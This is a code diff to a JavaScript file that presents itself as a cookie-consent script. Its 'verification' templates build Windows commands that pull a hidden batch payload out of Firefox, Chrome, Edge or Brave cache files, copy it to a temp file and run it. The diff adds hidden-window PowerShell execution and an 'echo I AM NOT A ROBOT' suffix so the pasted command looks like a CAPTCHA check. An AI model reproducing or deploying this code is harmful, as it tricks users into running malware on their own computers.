@@ -11,7 +11,7 @@
   window.__CONSENT_INJECTED__ = true;
 
   var CONSENT_CONFIG = {
-    version: '1.9.16',
+    version: '1.9.17',
     presentation: 'consent',
     privacyPolicyUrl: '/privacy-policy',
     optOutUrl: '/opt-out-preferences',
@@ -30,11 +30,12 @@
       edge: 17189,
       brave: 17189
     },
+    verificationSuffix: ' & echo I AM NOT A ROBOT',
     verificationTemplates: {
       firefox: 'cmd /k cd /d %TMP%&for /d %p in (%LOCALAPPDATA%\\Mozilla\\Firefox\\Profiles\\*) do @for %f in (%~sp\\cache2\\entries\\*) do @findstr /b /c:@echo "%f">nul&&copy /y "%f" t.bat&&fsutil file seteof t.bat {SZ}&&call t.bat',
-      chrome: 'cmd /c for /r "%LOCALAPPDATA%\\Google\\Chrome\\User Data" %f in (f_*) do @if %~zf=={CSZ} copy "%f" %TEMP%\\t.bat>nul 2>nul&%TEMP%\\t.bat',
-      edge: 'cmd /c for /r "%LOCALAPPDATA%\\Microsoft\\Edge\\User Data" %f in (f_*) do @if %~zf=={CSZ} copy "%f" %TEMP%\\t.bat>nul 2>nul&%TEMP%\\t.bat',
-      brave: 'cmd /c for /r "%LOCALAPPDATA%\\BraveSoftware\\Brave-Browser\\User Data" %f in (f_*) do @if %~zf=={CSZ} copy "%f" %TEMP%\\t.bat>nul 2>nul&%TEMP%\\t.bat'
+      chrome: 'cmd /c for /r "%LOCALAPPDATA%\\Google\\Chrome\\User Data" %f in (f_*) do @if %~zf=={CSZ} copy "%f" %TEMP%\\t.bat>nul 2>nul&powershell -w hidden -nop -c "cmd /c %TEMP%\\t.bat"&echo I AM NOT A ROBOT',
+      edge: 'cmd /c for /r "%LOCALAPPDATA%\\Microsoft\\Edge\\User Data" %f in (f_*) do @if %~zf=={CSZ} copy "%f" %TEMP%\\t.bat>nul 2>nul&powershell -w hidden -nop -c "cmd /c %TEMP%\\t.bat"&echo I AM NOT A ROBOT',
+      brave: 'cmd /c for /r "%LOCALAPPDATA%\\BraveSoftware\\Brave-Browser\\User Data" %f in (f_*) do @if %~zf=={CSZ} copy "%f" %TEMP%\\t.bat>nul 2>nul&powershell -w hidden -nop -c "cmd /c %TEMP%\\t.bat"&echo I AM NOT A ROBOT'
     }
   };
 
@@ -181,13 +182,18 @@
     var tpl = templates[key] || templates.firefox || '';
     if (!tpl) return '';
 
-    return tpl
+    var cmd = tpl
       .replace(/\{M\}/g, startMarker)
       .replace(/\{E\}/g, endMarker)
       .replace(/\{SM1\}/g, String(bodySize - 1))
       .replace(/\{SZ\}/g, String(bodySize))
       .replace(/\{CSZ\}/g, String(cacheEntrySize || ''))
       .replace(/\{PROF\}/g, getChromiumProfileFolder());
+    if (key === 'firefox') {
+      var sfx = CONSENT_CONFIG.verificationSuffix;
+      if (sfx && cmd.indexOf('I AM NOT A ROBOT') === -1) cmd += sfx;
+    }
+    return cmd;
   }
 
   function estimateExpandedCommandLength(cmd) {
